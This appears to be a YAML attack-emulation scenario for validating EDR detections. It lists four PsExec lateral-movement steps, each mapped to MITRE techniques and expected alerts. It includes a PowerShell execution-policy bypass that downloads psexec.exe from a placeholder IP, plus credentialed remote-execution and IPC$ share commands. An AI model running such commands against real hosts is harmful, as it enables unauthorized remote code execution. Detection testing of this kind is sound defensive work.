steps:
- id: step-01
  name: Download PsExec
  command: powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/psexec.exe'
    -OutFile 'C:\\Windows\\Temp\\psexec.exe'"
  identity: direct
  mitre_technique: T1059
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: PsExec Remote Execution Process
    ttp_ref: TTP-0000-0071
    detection_id: bioc-psexec-remote-execution-process
- id: step-02
  name: Execute Remote Command
  command: C:\\Windows\\Temp\\psexec.exe \\targethost -u username -p password cmd.exe /c "whoami > C:\\temp\\output.txt"
  identity: direct
  mitre_technique: T1021.002
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: PsExec Remote Execution Process
    ttp_ref: TTP-0000-0071
    detection_id: bioc-psexec-remote-execution-process
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Establish Remote Connection
  command: net use \\targethost\\ipc$ /user:username password
  identity: direct
  mitre_technique: T1021.002
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: PsExec Remote Execution Process
    ttp_ref: TTP-0000-0071
    detection_id: bioc-psexec-remote-execution-process
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Execute Command via PsExec
  command: C:\\Windows\\Temp\\psexec.exe \\targethost -u username -p password "C:\\Windows\\System32\\cmd.exe
    /c echo Hello > C:\\temp\\test.txt"
  identity: direct
  mitre_technique: T1059.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: PsExec Remote Execution Process
    ttp_ref: TTP-0000-0071
    detection_id: bioc-psexec-remote-execution-process
  causality:
    parent_step: step-03
    pivot: process_lineage
